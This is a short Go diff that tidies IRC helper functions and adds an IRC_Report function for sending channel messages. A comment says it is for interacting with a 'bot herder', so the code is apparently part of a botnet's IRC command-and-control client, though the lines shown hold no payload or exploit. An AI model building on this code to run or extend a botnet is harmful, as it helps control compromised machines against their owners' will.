@@ -24,16 +24,16 @@ func IRC_Conn(set_serv string) net.Conn {
 	return conn
 }
 
-func IRC_Find(read, msg string) bool {
-	return strings.Contains(read, msg)
-}
+func IRC_Find(read, msg string) bool { return strings.Contains(read, msg) }
 
-func IRC_Recv(cmd string, arg int) string {
-	return strings.Split(cmd, " ")[arg]
-}
+func IRC_Recv(cmd string, arg int) string { return strings.Split(cmd, " ")[arg] }
 
-func IRC_Send(sendIRC net.Conn, data string) {
-	fmt.Fprintf(sendIRC, "%s\r\n", data)
+//For interact with IRC backend
+func IRC_Send(sendIRC net.Conn, data string) { fmt.Fprintf(sendIRC, "%s\r\n", data) }
+
+//For interact with bot herder //More Easy to Read
+func IRC_Report(set_serv net.Conn, set_chan, msg string) {
+	IRC_Send(set_serv, "PRIVMSG "+set_chan+" :"+msg)
 }
 
 func IRC_Login(log_serv net.Conn, set_chan, set_chan_pass string) {
